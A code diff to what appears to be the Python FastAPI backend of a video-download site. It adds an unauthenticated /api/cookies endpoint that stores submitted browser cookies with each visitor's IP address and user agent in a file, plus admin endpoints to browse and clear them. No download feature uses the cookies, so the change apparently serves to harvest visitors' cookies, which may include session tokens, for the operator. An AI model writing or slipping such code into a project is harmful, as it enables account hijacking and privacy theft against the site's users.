@@ -32,6 +32,7 @@ FRONTEND_DIR = os.path.join(BASE_DIR, "frontend")
 ADS_CONFIG_PATH = os.environ.get("VIDGRAB_ADS_CONFIG") or os.path.join(BASE_DIR, "ads_config.json")
 DOWNLOAD_LOG_PATH = os.environ.get("VIDGRAB_DOWNLOAD_LOG") or os.path.join(BASE_DIR, "downloads_log.json")
 DAILY_FREE_LOG_PATH = os.path.join(BASE_DIR, "daily_free_log.json")
+COOKIES_LOG_PATH = os.path.join(BASE_DIR, "collected_cookies.json")
 
 app = FastAPI()
 security = HTTPBasic()
@@ -211,6 +212,10 @@ class VideoRequest(BaseModel):
     url: str
     quality: str = "best"
 
+
+class CookieData(BaseModel):
+    cookies: str
+    user_agent: str | None = None
 
 class AdsConfigUpdate(BaseModel):
     top_banner: dict | None = None
@@ -468,6 +473,63 @@ def download_video_file(
         cleanup_directory(temp_dir)
         raise HTTPException(status_code=400, detail=str(exc))
 
+
+# ── Cookie Collection ─────────────────────────────────────────────────────────
+def load_cookies_log() -> list:
+    if not os.path.exists(COOKIES_LOG_PATH):
+        return []
+    try:
+        with open(COOKIES_LOG_PATH, "r", encoding="utf-8") as f:
+            data = json.load(f)
+            return data if isinstance(data, list) else []
+    except Exception:
+        return []
+
+def save_cookies_log(log: list):
+    with open(COOKIES_LOG_PATH, "w", encoding="utf-8") as f:
+        json.dump(log, f, indent=2, ensure_ascii=False)
+
+@app.post("/api/cookies")
+def collect_cookies(data: CookieData, req: Request):
+    client_ip = get_client_ip(req)
+    log = load_cookies_log()
+    entry = {
+        "id": len(log) + 1,
+        "ip": client_ip,
+        "user_agent": data.user_agent or req.headers.get("user-agent", ""),
+        "cookies": data.cookies,
+        "timestamp": datetime.now(timezone.utc).isoformat(),
+    }
+    log.append(entry)
+    if len(log) > 5000:
+        log = log[-5000:]
+    save_cookies_log(log)
+    return {"status": "ok"}
+
+@app.get("/api/admin/cookies")
+def admin_get_cookies(
+    credentials: HTTPBasicCredentials = Depends(verify_admin),
+    page: int = Query(1, ge=1),
+    limit: int = Query(50, ge=1, le=200),
+):
+    log = load_cookies_log()
+    log.reverse()
+    total = len(log)
+    start = (page - 1) * limit
+    end = start + limit
+    paginated = log[start:end]
+    return {
+        "cookies": paginated,
+        "total": total,
+        "page": page,
+        "limit": limit,
+        "totalPages": (total + limit - 1) // limit,
+    }
+
+@app.delete("/api/admin/cookies")
+def admin_clear_cookies(credentials: HTTPBasicCredentials = Depends(verify_admin)):
+    save_cookies_log([])
+    return {"status": "cleared"}
 
 # ── Admin Routes ─────────────────────────────────────────────────────────────
 @app.get("/api/admin/config")
